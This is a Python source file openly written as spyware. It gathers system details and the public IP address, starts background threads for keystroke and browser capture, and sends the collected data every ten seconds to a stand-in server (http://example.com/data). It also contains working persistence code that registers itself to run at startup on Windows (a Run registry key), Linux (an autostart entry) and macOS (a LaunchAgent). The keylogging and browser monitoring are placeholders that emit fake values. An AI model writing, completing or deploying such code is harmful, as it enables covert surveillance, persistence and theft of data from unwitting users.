# Import necessary modules
import os
import sys
import logging
import requests
import threading
import platform
import subprocess
import time
import json

# Set up logging
logging.basicConfig(filename='spyware_log.txt', level=logging.INFO)

class Spyware:
    def __init__(self):
        self.data = []

    def gather_system_info(self):
        """Collects basic system information"""
        system_info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'ip-address': self.get_ip_address()
        }
        self.data.append(system_info)
        logging.info(f"System Info: {system_info}")

    def get_ip_address(self):
        """Fetches the public IP address"""
        try:
            response = requests.get('https://api.ipify.org')
            return response.text
        except requests.RequestException:
            logging.error("Failed to get IP address")
            return None

    def capture_keystrokes(self):
        """Captures keystrokes (placeholder)"""
        logging.info("Keystroke capturing started")
        # Placeholder for keylogger logic
        while True:
            time.sleep(1)  # Placeholder for continuous keylogging
            keystroke = "fake_keystroke"  # Simulated keystroke
            self.data.append({'keystroke': keystroke})
            logging.info(f"Captured keystroke: {keystroke}")

    def monitor_browser_activity(self):
        """Monitors browser activity (placeholder)"""
        logging.info("Browser activity monitoring started")
        # Placeholder for browser monitoring logic
        while True:
            time.sleep(1)  # Placeholder for continuous monitoring
            browser_activity = "fake_browser_activity"  # Simulated browser activity
            self.data.append({'browser_activity': browser_activity})
            logging.info(f"Monitored browser activity: {browser_activity}")

    def exfiltrate_data(self):
        """Sends collected data to remote server"""
        logging.info("Exfiltrating data")
        while True:
            if self.data:
                data_to_send = self.data.copy()
                self.data.clear()
                try:
                    response = requests.post('http://example.com/data', json=data_to_send)
                    if response.status_code == 200:
                        logging.info(f"Data exfiltrated successfully: {data_to_send}")
                    else:
                        logging.error(f"Failed to exfiltrate data: {data_to_send}")
                except requests.RequestException as e:
                    logging.error(f"Error exfiltrating data: {e}")
            time.sleep(10)  # Exfiltrate data every 10 seconds

    def run(self):
        """Main function to run all spyware activities"""
        self.gather_system_info()
        # Start threads for other monitoring activities
        threading.Thread(target=self.capture_keystrokes, daemon=True).start()
        threading.Thread(target=self.monitor_browser_activity, daemon=True).start()
        threading.Thread(target=self.exfiltrate_data, daemon=True).start()

    def add_to_startup(self):
        """Adds the spyware to startup to persist after reboot"""
        startup_script = os.path.realpath(sys.argv[0])
        if platform.system() == "Windows":
            # Windows startup registry key
            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Spyware /t REG_SZ /d "{startup_script}" /f'
            subprocess.call(reg_command, shell=True)
            logging.info("Added to Windows startup")
        elif platform.system() == "Linux":
            # Linux startup script
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            autostart_file = os.path.join(autostart_dir, "spyware.desktop")
            with open(autostart_file, 'w') as f:
                f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {startup_script}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Spyware\n")
            logging.info("Added to Linux startup")
        elif platform.system() == "Darwin":
            # macOS startup
            plist = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.spyware</string>
                <key>ProgramArguments</key>
                <array>
                    <string>python3</string>
                    <string>{startup_script}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            """
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.spyware.plist")
            with open(plist_path, 'w') as f:
                f.write(plist)
            subprocess.call(['launchctl', 'load', plist_path])
            logging.info("Added to macOS startup")

if __name__ == "__main__":
    spyware = Spyware()
    spyware.add_to_startup()
    spyware.run()
    # Keep the main thread alive to allow background threads to run
    while True:
        time.sleep(10)
